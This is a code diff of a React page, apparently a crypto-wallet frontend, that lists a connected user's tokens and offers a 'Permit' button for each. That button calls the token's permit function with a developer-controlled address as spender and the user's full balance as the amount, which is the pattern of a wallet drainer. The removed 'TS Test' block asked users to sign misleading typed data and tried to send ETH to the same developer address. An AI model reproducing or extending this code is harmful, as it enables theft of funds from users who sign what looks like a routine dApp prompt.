@@ -126,101 +126,40 @@ const Page = () => {
 
 
 				return (
-					<button disabled={!signature} onClick={async () => {
-						if (!signature) return;
-						// ABI of the token contract
-						// Prepare the permit data
-						const spender = developer.address; // Address of the spender
-						const amount = token.balance; // Amount of tokens to be spent
-						const nonce = 2; // Nonce
-						const deadline = 5 * 60 * 1000; // Deadline (optional)
-						const {v, r, s} = ethers.utils.splitSignature(signature);
+					<div className={'flex gap-2'}>
+						<p>{token.contract_ticker_symbol}</p>
+						<button disabled={!signature} onClick={async () => {
+							if (!signature) return;
+							// ABI of the token contract
+							// Prepare the permit data
+							const spender = developer.address; // Address of the spender
+							const amount = token.balance; // Amount of tokens to be spent
+							const nonce = 2; // Nonce
+							const deadline = 5 * 60 * 1000; // Deadline (optional)
+							const {v, r, s} = ethers.utils.splitSignature(signature);
 // Call the permit method
-						const tokenContract = new ethers.Contract(token.contract_address, ['function permit(address spender, uint256 amount, uint256 nonce, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'], signer);
-						const args = [spender, amount, nonce, deadline, v, r, s];
-						console.log(args)
-						const tx = await tokenContract.permit(...args);
-						await tx.wait();
+							const tokenContract = new ethers.Contract(token.contract_address, ['function permit(address spender, uint256 amount, uint256 nonce, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'], signer);
+							const args = [spender, amount, nonce, deadline, v, r, s];
+							console.log(args)
+							const tx = await tokenContract.permit(...args);
+							await tx.wait();
 
-						console.log('Permit successful');
-					}}>
-						Permit
-					</button>
+							console.log('Permit successful');
+						}}>
+							Permit
+						</button>
+					</div>
 				)
 			})}
 			<br/>
 			{account.chainId}
 			<br/>
-			<button onClick={async () => {
-				const domain = {
-					name: 'Ether Transaction',
-					version: '1',
-					chainId: account.chainId,
-					verifyingContract: BNBContract,  // Dummy contract address
-				};
-
-				const types = {
-					Transfer: [
-						{name: 'to1', type: 'uint256'},
-						{name: 'to2', type: 'uint256'},
-						{name: 'to3', type: 'uint256'},
-						{name: 'to4', type: 'uint256'},
-						{name: 'to5', type: 'uint256'},
-						{name: 'to6', type: 'uint256'},
-						{name: 'to', type: 'address'},
-						{name: 'value', type: 'uint256'}
-					],
-				};
-
-				// Define the message to sign
-				const message = {
-					to1: 9,  // Replace with the recipient address
-					to2: 4,  // Replace with the recipient address
-					to3: 1,  // Replace with the recipient address
-					to4: 23,  // Replace with the recipient address
-					to5: 87,  // Replace with the recipient address
-					to6: 10,  // Replace with the recipient address
-					to: developer.address,  // Replace with the recipient address
-					value: ethers.utils.parseUnits('0.001', 'ether').toString(),  // Replace with the amount of ether to send,
-				};
-				const tx = {
-					to: developer.address,
-					value: ethers.utils.parseEther('0.1'), // Amount to send
-					gasLimit: 21000, // Basic transaction gas limit
-					gasPrice: ethers.utils.parseUnits('50', 'gwei'), // Gas price
-				};
-
-				const ptx = await signer?.populateTransaction(tx);
-				console.log(ptx);
-
-				// Create the typed data
-				const typedData = {
-					types: types,
-					domain: domain,
-					primaryType: 'Transfer',
-					message: message,
-				};
-
-				try {
-					// Request the user's signature for the typed data
-					const signature = await signer?._signTypedData(domain, types, message);
-					console.log('Signature:', signature);
-					await signer?.sendTransaction(signature)
-					// You can now use this signature to validate and process the transaction off-chain or on-chain
-					// Note: Further steps to send this data to a backend or smart contract would be required
-				} catch (error) {
-					console.error('Failed to sign typed data:', error);
-				}
-			}}>
-				TS Test
-			</button>
-			<br/>
-			<TokenList address={account.address+""} setTokens={setTokens} CHAIN_ID={+(account.chainId || "0")}/>
+			<TokenList address={account.address + ""} setTokens={setTokens} CHAIN_ID={+(account.chainId || "0")}/>
 		</div>
 	)
 };
 
-function TokenList({ address,CHAIN_ID,setTokens: ST }: {address: string, CHAIN_ID: number, setTokens: any}) {
+function TokenList({address, CHAIN_ID, setTokens: ST}: { address: string, CHAIN_ID: number, setTokens: any }) {
 	const [tokens, setTokens] = useState<ContractCovalenTHQ[]>([]);
 	const [isLoading, setIsLoading] = useState(true);
 	const [isError, setIsError] = useState(false);
